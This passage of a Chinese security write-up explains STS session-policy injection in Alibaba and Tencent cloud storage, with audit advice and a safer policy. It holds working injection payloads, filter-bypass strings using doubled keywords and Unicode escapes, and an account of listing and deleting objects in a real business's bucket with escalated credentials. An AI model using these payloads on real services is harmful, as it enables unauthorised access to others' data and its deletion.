"cos:GetObject",  
  
"cos:PutObject"  
  
],  
  
"resource": [  
  
"qcs::cos:ap-guangzhou:uid/1320513951:BUCKET/uploads/alice/x.txt"  
  
]  
  
},  
  
{  
  
"effect": "allow",  
  
"action": [  
  
"*"  
  
],  
  
"resource": [  
  
"*"  
  
]  
  
}  
  
]  
  
}  
  
这里需要注意：腾讯云会拒绝重复键，因此，腾讯云的做法不是在同一条 Statement 中重复写一个  
action，然后等待后者覆盖前者，而是先把原来的 Statement 关闭，再追加一条全新的 Statement。statement 本身就是一个数组，数组里的每个对象就是一条独立的授权语句，所以第二个 { "effect": "allow" ... } 直接作为 statement 数组的第二个元素即可。若在它上面再嵌套一个 "statement"，就会改变  
  
策略结构，通常会导致格式错误或被云厂商拒绝。  
# 五、真实业务下的STS权限注入  
## sts提权导致的文件覆盖  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibc8WYl0QYdyiclkfiaia3uXubAic1qWtV599hqicZROjVIJAQu82jPiaDicJEAtnibjf2Z8hwlahNick06nSJK8X0Xz6plNPflKjIkXmo8/640?wx_fmt=png&from=appmsg "")  
  
我们使用ai分析这个加密 直接就把它解密出来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icT321NzvRZ0KxGPr5eicyY2MdbeI73XxtianNpXlVUQvukiaNLxbvGGEREWQIFibGR7P8rU3LFmagG6ZJc2RdVhLXCjbkFnYrI2uc/640?wx_fmt=png&from=appmsg "")  
  
即可利用提升权限的sts对resource的其他人的业务资源进行覆盖（没提升权限的sts无权限）  
## sts提权导致的列桶  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48U3em5KYTKUrpWpDPgCkBQcMdzYa6TZ0JMx2RUDiaQrJFGsZjrcQdE5yO92WVKgmJgRtSLcuyDf1GnDrbkvdbmiar4q65a8dwI0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48zzdJvNlmwG9Kwbjicr00wDK54eicMmjnZgXhbIxOugcFuZlD6XIgP6nxKWWqRNkoJCMhCHd2eUUp6BNR5cXpYhWPUrbiaDlkt3w/640?wx_fmt=png&from=appmsg "")  
  
这里存在一个 Policy 注入  
Policy 后面会把就是把前面的覆盖所以我们相对于拿到这个桶的完全权限了，我们调用它的 sdk 就可以看到 Listobject key  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4995XDokVokI3bGECyIjoxT6VBmZsA68lw96u5u1rWRWAHPUlFssx9fVibbRbicf1kfnXdUgRgvfJqaU0rgfD3MN1qMRYZbw5Mnw/640?wx_fmt=png&from=appmsg "")  
  
这个 sdk 可以获取全部的 key，删除也没问题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49Bg0XNPa0SepoH6pGm1DLTm13mB4fqJud8bqQpgicqOq6Er1HibkclAtRxUGasFr80qsnyiaqM16Q8nQiaCC1qGgic29rcEtTEQrqY/640?wx_fmt=png&from=appmsg "")  
  
这个 key 就会被我们删除然后配合 listobject key 就可以直接清空桶的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48REFl8fLdnMlZLPF8QppekxJKyVjdrtvUuTIuTCibmSUeUPgIicq7kIccD4pbjoZDYK4dmic8EMPHCZWXLNWJzicJGJvsOdqibbuPM/640?wx_fmt=png&from=appmsg "")  
  
覆盖也没有问题 这个配合 list 我们就可以覆盖别人的文件内容，但是为了不影响业务我就不执行这个  
# 六、不同厂商的 payload 为什么不一样  
## 第一个区别：注入点不同  
  
阿里云的模板类似：  
  
`{"Version":"1","Statement":[{"Effect":"Allow","Action":["oss:GetObject","oss:PutObject"],"Resource":["acs:oss:*:*:%s/%s"]}]}`  
  
这里用户输入位于：  
  
acs:oss:*:*:BUCKET/<fullPathFid>  
  
腾讯云的模板类似：  
  
`{"version":"2.0","statement":[{"effect":"allow","action":["cos:GetObject","cos:PutObject"],"resource":["qcs::cos:%s:uid/%s:%s/%s"]}]}`  
  
这里用户输入位于：  
  
qcs::cos:REGION:uid/APP_ID:BUCKET/<fullPathFid>  
  
两边都是把输入放进 Resource，但前面的固定内容和后面的固定内容不一样。因此，同一个 Payload 字节放进去后，生成的 JSON 结构也会不同。  
## 第二个区别：字段大小写不同  
  
阿里云 Policy 使用：  
  
{  
  
"Version": "1",  
  
"Statement": [],  
  
"Effect": "Allow",  
  
"Action": [],  
  
"Resource": []  
  
}  
  
腾讯云 COS 使用：  
  
{  
  
"version": "2.0",  
  
"statement": [],  
  
"effect": "allow",  
  
"action": [],  
  
"resource": []  
  
}  
  
因此，阿里云的注入片段要写：  
  
"Action":["*"],"Resource":["*  
  
腾讯云则要写：  
  
"action":["*"],"resource":["*  
  
如果大小写写错，Policy 可能被当成未知字段，或者直接被 API 拒绝。  
## 第三个区别：重复键的处理不同  
  
阿里云接受类似这样的结构：  
  
{  
  
"Action": ["oss:GetObject"],  
  
"Action": ["*"]  
  
}  
  
在本次验证中，后出现的  
Action被采用，所以只需要在原来的 Statement 中追加重复键，最终仍然只有一条 Statement。  
  
腾讯云的情况不同。类似结构会触发：  
  
Policy have duplicate key: action  
  
因此腾讯云不能沿用阿里云的“重复键覆盖”路线，而要改成新增 Statement：  
  
{  
  
"statement": [  
  
{  
  
"action": ["cos:PutObject"],  
  
"resource": ["OBJECT_KEY"]  
  
},  
  
{  
  
"action": ["*"],  
  
"resource": ["*"]  
  
}  
  
]  
  
}  
  
这就是为什么腾讯云 Payload 会比阿里云 Payload 多出：  
  
"]},{  
  
它的作用是结束第一条 Statement，并开始第二条 Statement。  
  
这里我就不再多说了，直接去不同的云厂商编辑一下策略就可以明白了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibP5SEy6koPgduBdMHSre21VDRYqFYicKIucZzk0EHibicQA8DC6PgGSrA8JgBv3cbxx0BPtBVdMOSl0kkbfPmj4oFvI7QbB9fmKs/640?wx_fmt=png&from=appmsg "")  
## 第四个区别：Resource 是否需要写完整资源串  
  
如果想把权限限制在当前 Bucket，一般写完整的 COS Resource：  
  
qcs::cos:REGION:uid/APP_ID:BUCKET/*  
  
这种写法粒度比较明确，但 Payload 很长。  
  
如果当前腾讯云 STS API 接受：  
  
"resource": ["*"]  
  
那么可以使用更短的 Payload：  
  
uploads/alice/x.txt"]},{"effect":"allow","action":["*"],"resource":["*  
  
这两个 Payload 的区别只是 Resource 范围不同：  
  
qcs::cos:REGION:uid/APP_ID:BUCKET/*  
  
表示当前 Bucket 下的对象范围，而：  
  
*  
  
表示更宽的资源通配范围。  
  
不过，  
Resource:*并不自动等于拿到所有云资源。  
STS 最终权限仍然需要和 CAM 角色权限取交集。如果角色只有 COS 上传权限，注入后仍然只会在这个上限内生效；如果角色同时拥有 CVM、COS 管理或其他服务权限，实际影响面就会更大，例如qcs::cos:*，最终权限永远受角色/CAM 上限、会话 Policy、显式 Deny 和服务自身资源模型共同限制。  
Action:*与  
Resource:*只是请求的权限集合，不会超出角色上限。  
## 第五个区别：Statement 数量只是结构差异  
  
阿里云的Payload：  
  
Statement 数量：1  
  
腾讯云的短 Payload：  
  
Statement 数量：2  
  
阿里云依赖重复键，所以一条 Statement 就能覆盖字段；  
  
腾讯云拒绝重复键，所以要新增 Statement；  
  
单纯传入  
  
*  
  
时，甚至可以保持一条 Statement，只把 Resource 放宽到  
  
BUCKET/*  
  
。  
  
真正需要检查的是每条 Statement 的：  
  
Effect  
  
Action  
  
Resource  
  
Condition  
# 最后总结  
  
漏洞根因相同：用户输入进入 Policy 语法  
  
注入目标相同：扩大 Action 或 Resource  
  
实现路径不同：适应各自的 Policy 解析规则  
  
阿里云当前路径可以概括为：  
  
闭合字符串 → 重复键覆盖 → Statement=1  
  
腾讯云当前路径可以概括为：  
  
闭合字符串 → 新增 Statement → Statement=2 或 3  
  
因此，换云时不能只替换  
oss和  
cos这两个动作前缀。还需要重新确认：  
  
Policy 字段大小写；  
  
Resource 格式；  
  
Action 前缀；  
  
重复键是否被接受；  
  
Resource:["*"]  
  
是否被接受；  
  
原始模板尾部需要如何补齐；  
  
CAM 或 RAM 角色自身的权限上限。  
# 七、绕过链：从 Policy修复到Unicode二次注入  
  
这里也是感谢朋友给提供的案例，在平台显示修复后，去问AI可能的修复方式，因为之前已经知道了此家厂商喜欢用Go语言作为主语言进行开发（返回头也有具体版本），因此本地搭建环境尝试进行绕过。  
  
这里AI给的例子是  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49tHXSnklCFzGT77Ya8WKH04aYTcVaJa4l0vlq8pD2TdibB56mBZLPDXKEEdXopJ0hSySBxXFCKkoMNq3OYDGCtuhEqNWibUM27o/640?wx_fmt=png&from=appmsg "")  
  
strings.ReplaceAll(input, "*", "")  
  
strings.ReplaceAll(input, "Action", "")  
  
strings.ReplaceAll(input, "{", "")  
  
strings.ReplaceAll(input, "}", "")  
  
开发喜欢这么修复  
  
func weakSanitize(input string) string {  
  
for _, token := range []string{"*", "Action", "{", "}"} {  
  
input = strings.ReplaceAll(input, token, "")  
  
}  
  
return input  
  
}  
  
对字符串去进行替换，可以进行修复。但是我们学过sql注入知道一个东西叫做双写绕过。因此我在思考的过程中也是尝试用SQL注入的双写进行绕过。原本的payload可以替换成  
  
Action-》ActACtionion  
  
{->{{  
  
也可以利用unicode去绕过它  
  
\u002a 是 JSON 标准中的 Unicode 转义写法，绝大多数主流语言的 JSON 解析器都会把它解析成 *。  
  
{  
  
"action": ["\u002a"]  
  
}  
  
解析后通常等价于：  
  
{  
  
"action": ["*"]  
  
}  
  
这里我觉得也没必要太过于解释，做安全的应该都学过  
  
这里也可以去云厂商进行Debug一下，发现其实云厂商也是支持这种写法的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49jIKLwMfcf6eILzRxic3M35bZmqzNcgDicwFnP7jLTrQ4ZSwo7ib7hsibgrSL13CibARrVncFeVZnfdxeX5KujATj0BeG6bVdcIwfo/640?wx_fmt=png&from=appmsg "")  
  
随便输入一个不存在的Unicode提示不正确  
  
输入*编码后的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48dkXw09OduuqMLJxJ19lzJ3L3XibRuFR3zsdPe2eia8h4CEvpOPluBn8NAjicCvcU77ukpT0ZUyOVm4ODUx9ntOicZBSaxCXN7IvI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48JUicTGo1AhO8E4N60UnhOR0raOQCWXgBI0l5y7JF8wWd9cNJT016YZWsS6T7TxbjOlkaIvVgOmN5h9afOXs8Rr30vwjwjTWpQ/640?wx_fmt=png&from=appmsg "")  
  
因此朋友后面又靠绕过特殊字符拿到了高危  
  
uploads/alice/x.txt"],"\u0041ction":["\u002a"],"\u0052esource":["\u002a  
  
uploads/alice/x.txt"],"\u0061ction":["\u002a"],"\u0072esource":["\u002a  
  
等 JSON 解析完成后，才还原成真正的字段名和通配符。用于闭合原始 Resource 字符串的 " 仍需保留。  
# 八、为啥我输入*不能列桶？  
  
在写这篇文章的时候，有小伙伴问了我一个问题，  
那既然输入流可以入侵到控制流，为什么在配置了ListObjects权限的时候，用*当作文件名不会列桶呢，带着疑问去做了一下复现。  
  
这一节需要先区分两个概念：对象级权限扩大，以及 Bucket 级列举权限。  
  
假设开发人员配置了如下 Policy：  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject",  
  
"oss:ListObjects"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:BUCKET/*"  
  
]  
  
}  
  
]  
  
}  
  
这里包含三个动作：  
  
oss:GetObject  
  
：读取对象；  
  
oss:PutObject  
  
：写入对象；  
  
oss:ListObjects  
  
：列举 Bucket 中的对象。  
  
其中，  
GetObject  
和  
PutObject  
通常针对对象资源，而  
ListObjects  
通常是 Bucket 级操作。因此，不能只看 Action 列表，还要同时检查每个动作对应的 Resource 是否符合云厂商的权限模型。  
  
传入普通文件名时发生什么  
  
假设服务端使用下面的模板：  
  
resource := fmt.Sprintf(  
  
"acs:oss:*:*:%s/%s",  
  
bucket,  
  
fullPathFid,  
  
)  
  
传入：  
  
123.png  
  
得到：  
  
acs:oss:*:*:BUCKET/123.png  
  
这个 Resource 通常只匹配一个对象。此时可以测试  
GetObject和  
PutObject是否限制在该对象范围内。  
  
但是，不能简单地说“对 123.png 拥有 ListObjects 权限”。  
ListObjects通常要求 Bucket 级 Resource，常见形式是：  
  
acs:oss:*:*:BUCKET  
  
而不是：  
  
acs:oss:*:*:BUCKET/123.png  
  
如果云厂商不接受对象级 Resource 绑定到  
ListObjects  
，列举请求会返回  
AccessDenied  
。  
  
把文件名改成 * 会发生什么  
  
传入：  
  
*  
  
服务端会生成：  
  
acs:oss:*:*:BUCKET/*  
  
ListObjects 是 Bucket 级的列举操作，不是针对某个单独对象的读取操作。因此不能像 GetObject 一样，把权限精确收缩到了：  
  
BUCKET/uploads/alice/123.png  
  
这里我测试的结果是其实会报错，列举授权  
  
通常是 Bucket 级；请求可携带 prefix 只返回某个前缀。prefix 是结果过滤参数，不等于 Policy 把 ListObjects 收缩到单个对象。  
  
什么情况下才可以列桶  
  
要让 STS 真正执行列桶，通常需要同时满足：  
  
Action 中包含  
  
oss:ListObjects  
  
；  
  
Resource 使用云厂商要求的 Bucket 级格式；  
  
RAM 角色本身允许该动作；  
  
没有显式 Deny；  
  
请求的 Bucket、地域和 Endpoint 正确。  
  
更清晰的 Policy 应拆成对象级和 Bucket 级两条 Statement：  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:BUCKET/uploads/alice/123.png"  
  
]  
  
},  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:ListObjects"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:BUCKET"  
  
]  
  
}  
  
]  
  
}  
  
但如果所有上传请求都直接获得第二条 Statement，那么普通用户无需输入  
*，申请一次正常 STS 就可能列桶。这属于上传凭证权限配置过宽，你也可以理解成脱裤子放屁，直接sts拿cdk探测权限就探测出来了，无论你输入啥他肯定都有这个权限  
  
所以在输入*的时候其实并不会当作资源通配符去解析，也就不存在列桶的问题  
# 九：文末  
  
STS Policy 注入的价值，其实仍然在于输入流入侵控制流这个老问题。当文件名、目录、扩展名、Object Key 等原本只应作为业务数据使用的参数，跨越数据边界进入 JSON Policy、模板、命令或查询语句时，它们就可能改变原本的授权语义。最终造成的未必都是传统意义上的代码执行，也可能是动作范围扩大、资源范围扩大、跨目录访问、对象覆盖，甚至临时凭证权限提升。  
  
所以审计 STS 相关接口时，重点不只是看有没有下发临时凭证，而是要继续思考：用户输入最终进入了哪里？服务端生成了怎样的Action、Resource、Condition 和 Object Key？角色上限是什么？这份临时凭证在数据面实际可以做什么？  
  
感谢 weiwei、zer0one、Clown 、知名小朋友等师傅在案例、思路和测试细节上提供的帮助。  
# 参考文献  
  
[1] 《STS 身份注入攻击》  
  
[https://mp.weixin.qq.com/s/RGHT7brTuLaJ91ouaLvRzQ](https://mp.weixin.qq.com/s?__biz=MzI0MTc0NjQyMQ==&mid=2247483858&idx=1&sn=66ee2fb04efd60fd8199af869e7509e9&scene=21#wechat_redirect)  
  
  
[2] 阿里云 RAM：AssumeRole API  
  
https://help.aliyun.com/zh/ram/developer-reference/api-sts-2015-04-01-assumerole  
  
[3] 阿里云 RAM：权限策略基本元素  
  
https://help.aliyun.com/zh/ram/user-guide/policy-elements  
  
[4] 腾讯云 CAM：策略语法  
  
https://cloud.tencent.com/document/product/598/10603  
  
[5] AWS IAM：Session Policies  
  
https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#policies_session  
  
[6] AWS STS：AssumeRole API  
  
https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html  
  
